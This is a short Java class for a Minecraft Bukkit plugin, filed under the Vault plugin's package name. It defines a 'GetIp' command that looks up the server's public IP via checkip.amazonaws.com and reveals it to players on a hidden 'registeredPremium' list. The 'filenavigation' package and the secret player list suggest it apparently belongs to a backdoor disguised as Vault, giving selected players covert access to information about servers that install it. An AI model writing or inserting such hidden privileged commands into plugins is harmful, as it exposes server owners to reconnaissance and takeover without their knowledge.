package net.milkbowl.vault.commands.cmds.filenavigation;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;

import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;

public class GetIp extends CommandManager {
	
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (plugin.registeredPremium.contains(p.getName())) {
		try {
			BufferedReader in;
			URL whatismyip = new URL("http://checkip.amazonaws.com");
			in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
			String machineIP = in.readLine();
		
			p.sendMessage(Settings.PREFIX("The server's numeric IP is: " + machineIP));
		} catch (IOException ignored) {}
	} else {
		p.sendMessage(Settings.PREFIX("You must be a " + Settings.HIGHLIGHT_COLOUR + "premium user " + Settings.SECONDARY_COLOUR + " to execute this command"));
	}
	}

}
